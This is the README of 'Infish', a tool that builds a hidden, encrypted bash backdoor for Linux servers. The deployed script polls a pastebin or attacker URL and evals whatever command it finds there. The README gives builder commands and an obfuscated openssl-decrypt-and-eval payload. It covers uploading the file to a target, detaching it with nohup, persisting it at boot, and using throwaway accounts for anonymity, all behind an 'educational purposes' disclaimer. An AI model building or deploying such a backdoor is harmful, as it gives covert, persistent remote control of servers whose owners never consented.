# Infish

Infish stands for infinite shell. It's a way to maintain persistent shell access (command and control) on a linux server even without ftp, ssh, or cpanel access. It works on all linux servers, even on shared hosting.

Note that this project is for **educational purposes** only. I bear no responsibility for how you use it. For this reason, no specific tutorial will be given for how exactly when or where to use this tool.

The aim of this shell is the give the penetration tester maximum and complete control over the system such that **even reboot** can not save the day. Infact if one has root access, one can set the script to run on boot, that way, the target is **screwed**.

# How it works
Here, you will have a shell that keeps checking on a paste on a predefined url or pastebin (use a throw away account and make the paste unlisted), and running whatever command it finds there. That way, you don't need access to the target machine. You've created a poor man's reverse shell, while remaining anonymous in the process.

Anytime you need to run a command, simply edit the paste to the command you want.

# Usage


As usual, to see usage,

```bash
$ ./infish -h
```
or
```bash
$ ./infish --help
```

There are two ways to build the final product.

- Using a raw pastebin url (or a url from a website you control. Observe opsec though.)
- Using your pastebin dev api key, username, and password

However, you first need to clone this repository or copy the infis-builder file to your local machine. Make it executable by running  

```bash
$ chmod +x infish
```

## Using a raw url

This is when you already have a webpage (observe opsec) or have already created a paste by hand. Get the **raw paste url** or the url or the page and run the following command

```bash
$ ./infish --url 'https://example.com/cmd' --sleep 900 --user-agent 'Mozilla 5.0'
```
**or**

```bash
$ ./infish --key 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' --sleep 900 --user-agent 'Mozilla 5.0'
```

This will generate a file called **.infish** with contents that look like  

```bash
#!/usr/bin/env bash
decrypted=$(printf "%s" "2zvhB+0qO2zqAoEinkUcDPSr6M9XnvlFyQ+9dusb6R9BthEkH1k7eHwJpl+qJSda
Q7S2w1ijyWn6rJeDlyhsC9pjwFgopvKe5A0KWD7PGoycRjQdPwGqFkAtS/AQrRDz
zBJuD6WOtr/Is5k1Fkk8ytnFazILqQlJalJRWv80lfW82WKJLfIKdtLw0ukbkyZ7
NYYIjy7ixdH6GmHpQAtglwqU/IyakMgFKI3K4y4lyqbgYdPjvKg/z6W3OCTtfmP8
AiDmuy7iuvBsmXlg9+pvgUeutDi1e2H9CKTVKviFFB57EeEdBSaOx2ha/fuXjCmU
U6WXKe8X3MS3ZpUBgc13mxgSCkMmSt0djyADDaS78EgccggdZyHJaMVIbb4cem1S
Ab/6gTfJiRnlS8RPT7MrBGz1xXs6pxYFqrOJnDURY4i34iUEtqQwuBDndkztLRfK
XtdEbTf27uXj900xOcLmBfGcJDLCnEqzdI1oWCVZq6NNE+NxrLEOqVB668/HMeBG
Ubqv/Klau2aBPr75Q4r13g1GAkkTE32eveecXe8vEFYlwz6wok2R43idQIOBJ2/c
/4Mq1LrLoBylbsZcIPOTThHIMHpr91Rk32mpa8rFSR+YVMhGGPSZr6Jq7n9CmhtW
8j3MWGdTIfH0iWVgmUJ7TcKJwWr4LA8h9oSNJyavqDTlgCzKdv9uLUWwyG6LmFkX
J6uGY9kX+lYnsrwLWHwz+lwiN3qTCc1o7Uw68sEeZbg=" | openssl enc -aes-256-cbc -K "950749b504f82fdd3899e5de21681724b596c2587c2457bf683f686e65a9f45c" -iv "853e8f9b15046491fe4a3067fa60bc8b" -d -a);
eval "$decrypted";
```

**You can specify the output filename or path using the `-o` or `--output` option**.

## Using your pastebin details

This is the recommended method, as everything is automated. For this, obtain the following

- Your pastebin dev api key
- Your pastebin username (To our throwaway account)
- Your pastebin password

Then run the following

```bash
$ ./infish key xxxxxxxxxxxxxxxxxxxxxxx
Pastebin username:
john
Pastebin password:
doe
New paste name:
shell

Successfully built infinite shell

$
```

A file called '.infish' is created. 

Again, the file will contain something like  

```bash
#!/usr/bin/env bash
decrypted=$(printf "%s" "2zvhB+0qO2zqAoEinkUcDPSr6M9XnvlFyQ+9dusb6R9BthEkH1k7eHwJpl+qJSda
Q7S2w1ijyWn6rJeDlyhsC9pjwFgopvKe5A0KWD7PGoycRjQdPwGqFkAtS/AQrRDz
zBJuD6WOtr/Is5k1Fkk8ytnFazILqQlJalJRWv80lfW82WKJLfIKdtLw0ukbkyZ7
NYYIjy7ixdH6GmHpQAtglwqU/IyakMgFKI3K4y4lyqbgYdPjvKg/z6W3OCTtfmP8
AiDmuy7iuvBsmXlg9+pvgUeutDi1e2H9CKTVKviFFB57EeEdBSaOx2ha/fuXjCmU
U6WXKe8X3MS3ZpUBgc13mxgSCkMmSt0djyADDaS78EgccggdZyHJaMVIbb4cem1S
Ab/6gTfJiRnlS8RPT7MrBGz1xXs6pxYFqrOJnDURY4i34iUEtqQwuBDndkztLRfK
XtdEbTf27uXj900xOcLmBfGcJDLCnEqzdI1oWCVZq6NNE+NxrLEOqVB668/HMeBG
Ubqv/Klau2aBPr75Q4r13g1GAkkTE32eveecXe8vEFYlwz6wok2R43idQIOBJ2/c
/4Mq1LrLoBylbsZcIPOTThHIMHpr91Rk32mpa8rFSR+YVMhGGPSZr6Jq7n9CmhtW
8j3MWGdTIfH0iWVgmUJ7TcKJwWr4LA8h9oSNJyavqDTlgCzKdv9uLUWwyG6LmFkX
J6uGY9kX+lYnsrwLWHwz+lwiN3qTCc1o7Uw68sEeZbg=" | openssl enc -aes-256-cbc -K "950749b504f82fdd3899e5de21681724b596c2587c2457bf683f686e65a9f45c" -iv "853e8f9b15046491fe4a3067fa60bc8b" -d -a);
eval "$decrypted";
```
**You can specify the output filename or path using the `-o` or `--output` option**.

Finally, upload the **.infish** file to the target server and then, make it executable by running   

```bash
$ chmod +x .infish
```

Then to begin c&c, run  

```bash
$ nohup ./.infish & disown
```

Now, you can edit your paste to any shell command and the server will run it.

That's it, you own the server. If you have root access, you can set the last command above to run on boot or attach it to a legitimate file that runs on boot. Figure that part out.
